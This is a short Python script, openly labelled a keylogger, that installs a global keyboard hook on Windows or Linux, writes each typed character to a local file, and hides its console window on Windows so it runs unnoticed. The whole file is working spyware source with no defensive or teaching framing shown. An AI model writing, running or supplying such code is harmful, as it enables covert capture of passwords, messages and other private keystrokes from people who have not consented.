# Python code for keylogger 
# to be used in windows
import platform
system = platform.system()
print(system)
isWindows = system == 'Windows'
if isWindows:
    import win32api
    import win32console 
    import win32gui
    import pyHook
    import pythoncom
else:
    import pyxhook
from threading import Lock

log_file = 'output.txt'
escape = {
    9: '\t',
    13: '\n'
}
edit_lock = Lock()
hasChanged = True

class KeyLogger:
    def OnKeyboardEvent(self,event):
        if event.Ascii >= 32:
            c = chr(event.Ascii)
            with open(log_file, 'a+') as f:
                f.write(c)
            #has file changed?
            edit_lock.acquire()
            hasChanged = False
            edit_lock.release()

        elif event.Ascii in escape:
            with open(log_file, 'a+') as f:
                f.write(escape[event.Ascii])
            edit_lock.acquire()
            hasChanged = False
            edit_lock.release()
        return True    

    def __init__(self):
        # create a hook manager object
        hm = None
        if isWindows:
            win = win32console.GetConsoleWindow() 
            win32gui.ShowWindow(win, 0) 
            hm = pyHook.HookManager()
        else:
            hm = pyxhook.HookManager()
        hm.KeyDown = self.OnKeyboardEvent 
        # set the hook 
        hm.HookKeyboard() 
        # wait forever
        if isWindows:
            pythoncom.PumpMessages()
        else:
            try:
                hm.start()         # start the hook 
            except KeyboardInterrupt: 
                # User cancelled from command line. 
                pass
            except Exception as ex:
                pass
